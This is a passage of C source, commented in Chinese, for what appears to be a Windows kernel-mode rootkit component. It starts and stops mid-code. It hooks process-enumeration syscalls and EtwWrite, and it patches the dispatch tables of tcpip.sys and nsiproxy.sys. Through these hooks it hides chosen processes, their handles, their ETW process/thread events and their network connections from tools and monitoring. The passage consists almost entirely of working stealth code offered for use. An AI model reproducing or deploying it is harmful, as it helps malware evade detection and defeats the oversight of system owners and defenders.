    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// ZwQuerySystemInformation 声明
NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    _In_ ULONG SystemInformationClass,
    _Inout_opt_ PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);

static PFN_NptNtQuerySystemInformation g_NptOriginalNtQuerySystemInformation = NULL;
static PNPT_HOOK_ENTRY g_NptNtQuerySystemInformationHook = NULL;

// ============================================================
// SystemInformationClass 常量定义
// ============================================================
#define NptSystemProcessInformation            5
#define NptSystemHandleInformation             16
#define NptSystemSessionProcessInformation     53
#define NptSystemExtendedProcessInformation    57
#define NptSystemExtendedHandleInformation     64
#define NptSystemFullProcessInformation        148

// ============================================================
// NtGetNextProcess/NtGetNextThread Hook
// ============================================================
typedef NTSTATUS (NTAPI *PFN_NptNtGetNextProcess)(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewProcessHandle
);

typedef NTSTATUS (NTAPI *PFN_NptNtGetNextThread)(
    HANDLE ProcessHandle,
    HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewThreadHandle
);

static PFN_NptNtGetNextProcess g_NptOriginalNtGetNextProcess = NULL;
static PNPT_HOOK_ENTRY g_NptNtGetNextProcessHook = NULL;
static PFN_NptNtGetNextThread g_NptOriginalNtGetNextThread = NULL;
static PNPT_HOOK_ENTRY g_NptNtGetNextThreadHook = NULL;

// ============================================================
// NtOpenProcess Hook
// ============================================================
typedef NTSTATUS (NTAPI *PFN_NptNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

static PFN_NptNtOpenProcess g_NptOriginalNtOpenProcess = NULL;
static PNPT_HOOK_ENTRY g_NptNtOpenProcessHook = NULL;

// ============================================================
// ETW Hook
// ============================================================
// EtwWrite 真实原型：5 个参数（不是 4 个！）
typedef NTSTATUS (NTAPI *PFN_NptEtwWrite)(
    PVOID   RegHandle,
    PVOID   EventDescriptor,
    LPCGUID ActivityId,
    ULONG   UserDataCount,
    PVOID   UserData
);

static PFN_NptEtwWrite g_NptOriginalEtwWrite = NULL;
static PNPT_HOOK_ENTRY g_NptEtwWriteHook = NULL;

// ETW Event IDs
#define NPT_ETW_PROCESS_START_EVENT_ID   1
#define NPT_ETW_PROCESS_STOP_EVENT_ID    2
#define NPT_ETW_THREAD_START_EVENT_ID    3
#define NPT_ETW_THREAD_STOP_EVENT_ID     4

typedef struct _NPT_EVENT_DESCRIPTOR {
    USHORT Id;
    UCHAR  Version;
    UCHAR  Channel;
    UCHAR  Level;
    UCHAR  Opcode;
    USHORT Task;
    ULONGLONG Keyword;
} NPT_EVENT_DESCRIPTOR, *PNPT_EVENT_DESCRIPTOR;

typedef struct _NPT_EVENT_DATA_DESCRIPTOR {
    ULONGLONG Ptr;
    ULONG Size;
    ULONG Reserved;
} NPT_EVENT_DATA_DESCRIPTOR, *PNPT_EVENT_DATA_DESCRIPTOR;

// ============================================================
// 网络连接隐藏 Hook
// ============================================================

typedef NTSTATUS (NTAPI *PFN_NptNtDeviceIoControlFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
);

static PFN_NptNtDeviceIoControlFile g_NptOriginalNtDeviceIoControlFile = NULL;
static PNPT_HOOK_ENTRY g_NptNtDeviceIoControlFileHook = NULL;

// MIB_TCPROW_OWNER_PID 结构
typedef struct _NPT_MIB_TCPROW_OWNER_PID {
    ULONG dwState;
    ULONG dwLocalAddr;
    ULONG dwLocalPort;
    ULONG dwRemoteAddr;
    ULONG dwRemotePort;
    ULONG dwOwningPid;
} NPT_MIB_TCPROW_OWNER_PID, *PNPT_MIB_TCPROW_OWNER_PID;

typedef struct _NPT_MIB_TCPTABLE_OWNER_PID {
    ULONG dwNumEntries;
    NPT_MIB_TCPROW_OWNER_PID table[1];
} NPT_MIB_TCPTABLE_OWNER_PID, *PNPT_MIB_TCPTABLE_OWNER_PID;

typedef struct _NPT_MIB_UDPROW_OWNER_PID {
    ULONG dwLocalAddr;
    ULONG dwLocalPort;
    ULONG dwOwningPid;
} NPT_MIB_UDPROW_OWNER_PID, *PNPT_MIB_UDPROW_OWNER_PID;

typedef struct _NPT_MIB_UDPTABLE_OWNER_PID {
    ULONG dwNumEntries;
    NPT_MIB_UDPROW_OWNER_PID table[1];
} NPT_MIB_UDPTABLE_OWNER_PID, *PNPT_MIB_UDPTABLE_OWNER_PID;

// SYSTEM_PROCESS_INFORMATION 结构
typedef struct _NPT_SYSTEM_PROCESS_INFO {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
} NPT_SYSTEM_PROCESS_INFO, *PNPT_SYSTEM_PROCESS_INFO;

// SYSTEM_HANDLE_TABLE_ENTRY_INFO 结构
typedef struct _NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PNPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _NPT_SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} NPT_SYSTEM_HANDLE_INFORMATION, *PNPT_SYSTEM_HANDLE_INFORMATION;

typedef struct _NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PNPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _NPT_SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} NPT_SYSTEM_HANDLE_INFORMATION_EX, *PNPT_SYSTEM_HANDLE_INFORMATION_EX;

typedef struct _NPT_SYSTEM_SESSION_PROCESS_INFORMATION {
    ULONG SessionId;
    ULONG SizeOfBuf;
    PVOID Buffer;
} NPT_SYSTEM_SESSION_PROCESS_INFORMATION, *PNPT_SYSTEM_SESSION_PROCESS_INFORMATION;

BOOLEAN NptHookIsProcessHidden(ULONG ProcessId)
{
    ULONG i;
    KIRQL oldIrql;
    BOOLEAN result = FALSE;
    
    if (KeGetCurrentIrql() > DISPATCH_LEVEL) {
        ULONG count = (ULONG)InterlockedCompareExchange(
            (volatile LONG *)&g_NptHiddenProcessCount, 0, 0);
        for (i = 0; i < count && i < MAX_HIDDEN_PROCESSES; i++) {
            if (g_NptHiddenProcessIds[i] == ProcessId) {
                return TRUE;
            }
        }
        return FALSE;
    }

    KeAcquireSpinLock(&g_NptHiddenProcessLock, &oldIrql);
    
    for (i = 0; i < g_NptHiddenProcessCount && i < MAX_HIDDEN_PROCESSES; i++) {
        if (g_NptHiddenProcessIds[i] == ProcessId) {
            result = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_NptHiddenProcessLock, oldIrql);
    
    return result;
}

ULONG
NptHookGetHiddenProcessCount(VOID)
{
    return (ULONG)InterlockedCompareExchange(
        (volatile LONG *)&g_NptHiddenProcessCount,
        0,
        0);
}

static BOOLEAN NptIsProcessHidden(ULONG ProcessId)
{
    return NptHookIsProcessHidden(ProcessId);
}

static VOID NptAddHiddenProcess(ULONG ProcessId)
{
    KIRQL oldIrql;
    ULONG i;
    
    if (ProcessId == 0 || ProcessId == 4) {
        return;
    }
    
    KeAcquireSpinLock(&g_NptHiddenProcessLock, &oldIrql);
    
    if (g_NptHiddenProcessCount < MAX_HIDDEN_PROCESSES) {
        for (i = 0; i < g_NptHiddenProcessCount; i++) {
            if (g_NptHiddenProcessIds[i] == ProcessId) {
                KeReleaseSpinLock(&g_NptHiddenProcessLock, oldIrql);
                return;
            }
        }
        g_NptHiddenProcessIds[g_NptHiddenProcessCount++] = ProcessId;
        DbgPrint("[NPT-Hook] Added hidden process: PID=%d\n", ProcessId);
    }
    
    KeReleaseSpinLock(&g_NptHiddenProcessLock, oldIrql);
}

NTSTATUS
NptHookAddHiddenProcessState(
    _In_ ULONG ProcessId
)
{
    if (ProcessId == 0 || ProcessId == 4) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() > DISPATCH_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    if (NptHookIsProcessHidden(ProcessId)) {
        return STATUS_SUCCESS;
    }

    NptAddHiddenProcess(ProcessId);
    return NptHookIsProcessHidden(ProcessId)
        ? STATUS_SUCCESS
        : STATUS_INSUFFICIENT_RESOURCES;
}

static VOID NptFilterProcessList(PVOID SystemInformation)
{
    PNPT_SYSTEM_PROCESS_INFO current;
    PNPT_SYSTEM_PROCESS_INFO previous = NULL;
    ULONG hiddenCount = 0;
    ULONG iterationCount = 0;
    
    if (!SystemInformation || g_NptHiddenProcessCount == 0) {
        return;
    }
    
    __try {
        current = (PNPT_SYSTEM_PROCESS_INFO)SystemInformation;
        
        while (iterationCount < 10000) {
            ULONG processId;
            ULONG nextOffset;
            
            iterationCount++;
            
            __try {
                processId = (ULONG)(ULONG_PTR)current->UniqueProcessId;
                nextOffset = current->NextEntryOffset;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                break;
            }
            
            if (nextOffset > 0x100000 && nextOffset != 0) {
                break;
            }
            
            if (NptIsProcessHidden(processId)) {
                hiddenCount++;
                
                if (previous != NULL) {
                    __try {
                        if (nextOffset == 0) {
                            previous->NextEntryOffset = 0;
                        }
                        else {
                            previous->NextEntryOffset += nextOffset;
                        }
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER) {
                        break;
                    }
                    
                    if (nextOffset == 0) break;
                    current = (PNPT_SYSTEM_PROCESS_INFO)((PUCHAR)current + nextOffset);
                    continue;
                }
            }
            
            previous = current;
            
            if (nextOffset == 0) break;
            current = (PNPT_SYSTEM_PROCESS_INFO)((PUCHAR)current + nextOffset);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[NPT-Hook] Exception in FilterProcessList\n");
    }
}

/*
 * 过滤句柄列表 (SystemHandleInformation, class=16)
 */
static VOID NptFilterHandleList(PVOID SystemInformation, ULONG SystemInformationLength)
{
    PNPT_SYSTEM_HANDLE_INFORMATION handleInfo;
    ULONG i, j;
    
    if (!SystemInformation || SystemInformationLength < sizeof(NPT_SYSTEM_HANDLE_INFORMATION)) {
        return;
    }
    
    if (g_NptHiddenProcessCount == 0) {
        return;
    }
    
    __try {
        handleInfo = (PNPT_SYSTEM_HANDLE_INFORMATION)SystemInformation;
        
        j = 0;
        for (i = 0; i < handleInfo->NumberOfHandles; i++) {
            USHORT processId = handleInfo->Handles[i].UniqueProcessId;
            
            if (!NptIsProcessHidden((ULONG)processId)) {
                if (i != j) {
                    RtlCopyMemory(&handleInfo->Handles[j],
                                  &handleInfo->Handles[i],
                                  sizeof(NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO));
                }
                j++;
            }
        }
        
        handleInfo->NumberOfHandles = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 过滤扩展句柄列表 (SystemExtendedHandleInformation, class=64)
 */
static VOID NptFilterExtendedHandleList(PVOID SystemInformation, ULONG SystemInformationLength)
{
    PNPT_SYSTEM_HANDLE_INFORMATION_EX handleInfo;
    ULONG_PTR i, j;
    
    if (!SystemInformation || SystemInformationLength < sizeof(NPT_SYSTEM_HANDLE_INFORMATION_EX)) {
        return;
    }
    
    if (g_NptHiddenProcessCount == 0) {
        return;
    }
    
    __try {
        handleInfo = (PNPT_SYSTEM_HANDLE_INFORMATION_EX)SystemInformation;
        
        j = 0;
        for (i = 0; i < handleInfo->NumberOfHandles; i++) {
            ULONG processId = (ULONG)handleInfo->Handles[i].UniqueProcessId;
            
            if (!NptIsProcessHidden(processId)) {
                if (i != j) {
                    RtlCopyMemory(&handleInfo->Handles[j],
                                  &handleInfo->Handles[i],
                                  sizeof(NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
                }
                j++;
            }
        }
        
        handleInfo->NumberOfHandles = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 过滤会话进程信息 (SystemSessionProcessInformation, class=53)
 */
static VOID NptFilterSessionProcessList(PVOID SystemInformation)
{
    PNPT_SYSTEM_SESSION_PROCESS_INFORMATION sessionInfo;
    
    if (!SystemInformation || g_NptHiddenProcessCount == 0) {
        return;
    }
    
    __try {
        sessionInfo = (PNPT_SYSTEM_SESSION_PROCESS_INFORMATION)SystemInformation;
        
        if (sessionInfo->Buffer && sessionInfo->SizeOfBuf > sizeof(NPT_SYSTEM_PROCESS_INFO)) {
            NptFilterProcessList(sessionInfo->Buffer);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 辅助函数：从句柄获取进程ID
 */
VOID
NptHookFilterProcessInformation(
    _In_ ULONG SystemInformationClass,
    _Inout_updates_bytes_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength
)
{
    if (!SystemInformation || SystemInformationLength < sizeof(ULONG) ||
        NptHookGetHiddenProcessCount() == 0) {
        return;
    }

    switch (SystemInformationClass) {
    case 5:
    case 57:
    case 148:
        NptFilterProcessList(SystemInformation);
        break;
    case 53:
        NptFilterSessionProcessList(SystemInformation);
        break;
    case 16:
        NptFilterHandleList(SystemInformation, SystemInformationLength);
        break;
    case 64:
        NptFilterExtendedHandleList(SystemInformation, SystemInformationLength);
        break;
    default:
        break;
    }
}

static ULONG NptGetProcessIdFromHandle(HANDLE ProcessHandle)
{
    PEPROCESS process = NULL;
    ULONG processId = 0;
    NTSTATUS status;
    
    if (ProcessHandle == NULL || ProcessHandle == NtCurrentProcess()) {
        return (ULONG)(ULONG_PTR)PsGetCurrentProcessId();
    }
    
    status = ObReferenceObjectByHandle(
        ProcessHandle,
        0,
        *PsProcessType,
        KernelMode,
        (PVOID*)&process,
        NULL
    );
    
    if (NT_SUCCESS(status) && process) {
        processId = (ULONG)(ULONG_PTR)PsGetProcessId(process);
        ObDereferenceObject(process);
    }
    
    return processId;
}

/*
 * HookedNtGetNextProcess - 跳过隐藏的进程
 */
NTSTATUS
NTAPI
NptHookedNtGetNextProcess(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewProcessHandle
)
{
    NPT_DIRECT_CALLBACK_BEGIN(g_NptNtGetNextProcessHook)
    NTSTATUS status;
    HANDLE currentHandle = ProcessHandle;
    ULONG loopCount = 0;
    const ULONG MAX_LOOPS = 1000;
    PFN_NptNtGetNextProcess originalFunc;
    
    originalFunc = g_NptOriginalNtGetNextProcess;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    if (g_NptHiddenProcessCount == 0) {
        return originalFunc(ProcessHandle, DesiredAccess, HandleAttributes, Flags, NewProcessHandle);
    }
    
    while (loopCount < MAX_LOOPS) {
        loopCount++;
        
        status = originalFunc(currentHandle, DesiredAccess, HandleAttributes, Flags, NewProcessHandle);
        
        if (!NT_SUCCESS(status)) {
            return status;
        }
        
        if (NewProcessHandle && *NewProcessHandle) {
            ULONG newPid = NptGetProcessIdFromHandle(*NewProcessHandle);
            
            if (newPid != 0 && NptIsProcessHidden(newPid)) {
                currentHandle = *NewProcessHandle;
                continue;
            }
        }
        
        return status;
    }
    
    return STATUS_NO_MORE_ENTRIES;
    NPT_DIRECT_CALLBACK_END()
}

/*
 * HookedNtGetNextThread - 跳过隐藏进程的线程
 */
NTSTATUS
NTAPI
NptHookedNtGetNextThread(
    HANDLE ProcessHandle,
    HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewThreadHandle
)
{
    NPT_DIRECT_CALLBACK_BEGIN(g_NptNtGetNextThreadHook)
    PFN_NptNtGetNextThread originalFunc;
    ULONG processId;
    
    originalFunc = g_NptOriginalNtGetNextThread;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    if (g_NptHiddenProcessCount == 0) {
        return originalFunc(ProcessHandle, ThreadHandle, DesiredAccess, HandleAttributes, Flags, NewThreadHandle);
    }
    
    processId = NptGetProcessIdFromHandle(ProcessHandle);
    if (processId != 0 && NptIsProcessHidden(processId)) {
        return STATUS_INVALID_HANDLE;
    }
    
    return originalFunc(ProcessHandle, ThreadHandle, DesiredAccess, HandleAttributes, Flags, NewThreadHandle);
    NPT_DIRECT_CALLBACK_END()
}

/*
 * HookedNtOpenProcess - 阻止打开隐藏的进程
 */
NTSTATUS
NTAPI
NptHookedNtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
)
{
    NPT_DIRECT_CALLBACK_BEGIN(g_NptNtOpenProcessHook)
    PFN_NptNtOpenProcess originalFunc;
    
    originalFunc = g_NptOriginalNtOpenProcess;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    if (g_NptHiddenProcessCount == 0) {
        return originalFunc(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    }
    
    if (ClientId != NULL) {
        __try {
            ULONG targetPid = (ULONG)(ULONG_PTR)ClientId->UniqueProcess;
            
            if (targetPid != 0 && NptIsProcessHidden(targetPid)) {
                return STATUS_INVALID_CID;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }
    }
    
    return originalFunc(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    NPT_DIRECT_CALLBACK_END()
}

/*
 * HookedEtwWrite - 过滤 ETW 进程事件
 */
NTSTATUS
NTAPI
NptHookedEtwWrite(
    PVOID   RegHandle,
    PVOID   EventDescriptor,
    LPCGUID ActivityId,
    ULONG   UserDataCount,
    PVOID   UserData
)
{
    NPT_DIRECT_CALLBACK_BEGIN(g_NptEtwWriteHook)
    PFN_NptEtwWrite originalFunc;
    PNPT_EVENT_DESCRIPTOR eventDesc;

    originalFunc = g_NptOriginalEtwWrite;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }

    if (g_NptHiddenProcessCount == 0) {
        return originalFunc(RegHandle, EventDescriptor, ActivityId, UserDataCount, UserData);
    }

    __try {
        if (EventDescriptor == NULL) {
            return originalFunc(RegHandle, EventDescriptor, ActivityId, UserDataCount, UserData);
        }

        eventDesc = (PNPT_EVENT_DESCRIPTOR)EventDescriptor;

        if (eventDesc->Id == NPT_ETW_PROCESS_START_EVENT_ID ||
            eventDesc->Id == NPT_ETW_PROCESS_STOP_EVENT_ID ||
            eventDesc->Id == NPT_ETW_THREAD_START_EVENT_ID ||
            eventDesc->Id == NPT_ETW_THREAD_STOP_EVENT_ID) {

            if (UserDataCount > 0 && UserData != NULL) {
                PNPT_EVENT_DATA_DESCRIPTOR dataDesc = (PNPT_EVENT_DATA_DESCRIPTOR)UserData;

                if (dataDesc->Size >= sizeof(ULONG) && dataDesc->Ptr != 0) {
                    __try {
                        ULONG eventPid = *(PULONG)(ULONG_PTR)dataDesc->Ptr;

                        if (NptIsProcessHidden(eventPid)) {
                            return STATUS_SUCCESS;
                        }
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER) {
                    }
                }
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }

    return originalFunc(RegHandle, EventDescriptor, ActivityId, UserDataCount, UserData);
    NPT_DIRECT_CALLBACK_END()
}

// ============================================================
// 网络连接过滤 - 底层 Hook
// ============================================================

// 前向声明
static VOID NptScanAndReplaceHiddenPids(PVOID Buffer, ULONG BufferLength);

// ObReferenceObjectByName 声明（用于获取驱动对象）
NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
    _In_ PUNICODE_STRING ObjectName,
    _In_ ULONG Attributes,
    _In_opt_ PACCESS_STATE AccessState,
    _In_opt_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_TYPE ObjectType,
    _In_ KPROCESSOR_MODE AccessMode,
    _Inout_opt_ PVOID ParseContext,
    _Out_ PVOID* Object
);
extern POBJECT_TYPE* IoDriverObjectType;

// tcpip.sys 和 nsiproxy.sys 驱动对象
static PDRIVER_OBJECT g_NptTcpipDriverObject = NULL;
static PDRIVER_OBJECT g_NptNsiproxyDriverObject = NULL;

// 原始派遣函数
typedef NTSTATUS (*NPT_DRIVER_DISPATCH_FUNC)(PDEVICE_OBJECT DeviceObject, PIRP Irp);
static NPT_DRIVER_DISPATCH_FUNC g_NptOriginalTcpipDeviceControl = NULL;
static NPT_DRIVER_DISPATCH_FUNC g_NptOriginalNsiproxyDeviceControl = NULL;
static NPT_DRIVER_DISPATCH_FUNC g_NptOriginalTcpipInternalDeviceControl = NULL;
static NPT_DRIVER_DISPATCH_FUNC g_NptOriginalNsiproxyInternalDeviceControl = NULL;

/*
 * Hook tcpip.sys 的 IRP_MJ_DEVICE_CONTROL
 */
static NTSTATUS
NptHookedTcpipDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PIO_STACK_LOCATION irpSp;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_NptOriginalTcpipDeviceControl || g_NptHiddenProcessCount == 0) {
        if (g_NptOriginalTcpipDeviceControl) {
            return g_NptOriginalTcpipDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    status = g_NptOriginalTcpipDeviceControl(DeviceObject, Irp);
    
    if (NT_SUCCESS(status)) {
        irpSp = IoGetCurrentIrpStackLocation(Irp);
        outputBuffer = Irp->UserBuffer;
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                NptScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * Hook nsiproxy.sys 的 IRP_MJ_DEVICE_CONTROL
 */
static NTSTATUS
NptHookedNsiproxyDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PIO_STACK_LOCATION irpSp;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_NptOriginalNsiproxyDeviceControl || g_NptHiddenProcessCount == 0) {
        if (g_NptOriginalNsiproxyDeviceControl) {
            return g_NptOriginalNsiproxyDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    status = g_NptOriginalNsiproxyDeviceControl(DeviceObject, Irp);
    
    if (NT_SUCCESS(status)) {
        irpSp = IoGetCurrentIrpStackLocation(Irp);
        outputBuffer = Irp->UserBuffer;
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                NptScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * Hook tcpip.sys 的 IRP_MJ_INTERNAL_DEVICE_CONTROL
 */
static NTSTATUS
NptHookedTcpipInternalDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_NptOriginalTcpipInternalDeviceControl || g_NptHiddenProcessCount == 0) {
        if (g_NptOriginalTcpipInternalDeviceControl) {
            return g_NptOriginalTcpipInternalDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    status = g_NptOriginalTcpipInternalDeviceControl(DeviceObject, Irp);
    
    if (NT_SUCCESS(status)) {
        outputBuffer = Irp->UserBuffer;
        if (!outputBuffer) {
            outputBuffer = Irp->AssociatedIrp.SystemBuffer;
        }
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                NptScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * Hook nsiproxy.sys 的 IRP_MJ_INTERNAL_DEVICE_CONTROL
 */
static NTSTATUS
NptHookedNsiproxyInternalDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_NptOriginalNsiproxyInternalDeviceControl || g_NptHiddenProcessCount == 0) {
        if (g_NptOriginalNsiproxyInternalDeviceControl) {
            return g_NptOriginalNsiproxyInternalDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    status = g_NptOriginalNsiproxyInternalDeviceControl(DeviceObject, Irp);
    
    if (NT_SUCCESS(status)) {
        outputBuffer = Irp->UserBuffer;
        if (!outputBuffer) {
            outputBuffer = Irp->AssociatedIrp.SystemBuffer;
        }
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                NptScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * 安装驱动派遣函数 Hook (支持指定 MajorFunction)
 */
static NTSTATUS NptInstallDriverDispatchHookEx(
    PCWSTR DriverName,
    UCHAR MajorFunction,
    PDRIVER_OBJECT *OutDriverObject,
    NPT_DRIVER_DISPATCH_FUNC *OriginalFunc,
    NPT_DRIVER_DISPATCH_FUNC NewFunc
)
{
    NTSTATUS status;
    UNICODE_STRING driverPath;
    WCHAR fullPath[256];
    PDRIVER_OBJECT driverObject = NULL;
    
    RtlStringCchPrintfW(fullPath, 256, L"\\Driver\\%ws", DriverName);
    RtlInitUnicodeString(&driverPath, fullPath);
    
    if (*OutDriverObject != NULL) {
        driverObject = *OutDriverObject;
    } else {
        status = ObReferenceObjectByName(
            &driverPath,
            OBJ_CASE_INSENSITIVE,
            NULL,
            0,
            *IoDriverObjectType,
            KernelMode,
            NULL,
            (PVOID*)&driverObject
        );
        
        if (!NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] Failed to find driver %ws: 0x%X\n", DriverName, status);
            return status;
        }
        
        *OutDriverObject = driverObject;
    }
    
    *OriginalFunc = (NPT_DRIVER_DISPATCH_FUNC)driverObject->MajorFunction[MajorFunction];
    
    InterlockedExchangePointer(
        (PVOID*)&driverObject->MajorFunction[MajorFunction],
        (PVOID)NewFunc
    );
    
    DbgPrint("[NPT-Hook] Hooked %ws MajorFunction[%d]: %p -> %p\n",
        DriverName, MajorFunction, *OriginalFunc, NewFunc);
    
    return STATUS_SUCCESS;
}

/*
 * 安装驱动派遣函数 Hook (IRP_MJ_DEVICE_CONTROL)
 */
static NTSTATUS NptInstallDriverDispatchHook(
    PCWSTR DriverName,
    PDRIVER_OBJECT *OutDriverObject,
    NPT_DRIVER_DISPATCH_FUNC *OriginalFunc,
    NPT_DRIVER_DISPATCH_FUNC NewFunc
)
{
    return NptInstallDriverDispatchHookEx(
        DriverName,
        IRP_MJ_DEVICE_CONTROL,
        OutDriverObject,
        OriginalFunc,
        NewFunc
    );
}

/*
 * 安装网络驱动 Hook
 */
static VOID NptInstallNetworkDriverHooks(VOID)
{
    NTSTATUS status;
    
    // Hook tcpip.sys IRP_MJ_DEVICE_CONTROL
    if (g_NptTcpipDriverObject == NULL) {
        status = NptInstallDriverDispatchHook(
            L"tcpip",
            &g_NptTcpipDriverObject,
            &g_NptOriginalTcpipDeviceControl,
            NptHookedTcpipDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] tcpip.sys IRP_MJ_DEVICE_CONTROL hook installed\n");
        }
    }
    
    // Hook tcpip.sys IRP_MJ_INTERNAL_DEVICE_CONTROL
    if (g_NptTcpipDriverObject != NULL && g_NptOriginalTcpipInternalDeviceControl == NULL) {
        status = NptInstallDriverDispatchHookEx(
            L"tcpip",
